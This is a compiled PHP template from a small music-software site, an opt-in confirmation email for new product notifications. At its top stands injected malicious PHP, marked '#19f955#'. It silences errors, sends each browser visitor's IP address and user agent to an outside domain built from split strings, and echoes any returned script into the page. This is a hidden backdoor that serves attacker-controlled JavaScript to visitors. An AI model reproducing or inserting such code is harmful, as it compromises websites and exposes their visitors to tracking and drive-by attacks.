<?php /* Smarty version 2.6.22, created on 2009-05-27 12:10:29
         compiled from /home/a1425978/public_html/beta//templates//mail/opt_in.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<h3>Thank you for opting to receive 
<a href="http://www.alanmarcero.com">AlanMarcero.com</a> new product notifications</h3>

<p>
	This email is to confirm that you will be receiving all future AlanMarcero.com new product 
	notifications.  These notifications are to inform you of new products added to the 
	AlanMarcero.com catalog such as new synthesizer patch banks.
</p>

<p>
	At any point you may opt-out of new product notifications by going 
	<a href="http://www.alanmarcero.com/opt_out.php?opt_out=<?php echo $this->_tpl_vars['email']; ?>
">here</a> or by 
	clicking the "opt-out" link on the bottom of every page.
</p>

<p>&nbsp;</p>

<p>Sincerly,</p>

<p>
	Alan Marcero<br />
	<a href="http://www.alanmarcero.com">http://www.alanmarcero.com</a>
</p>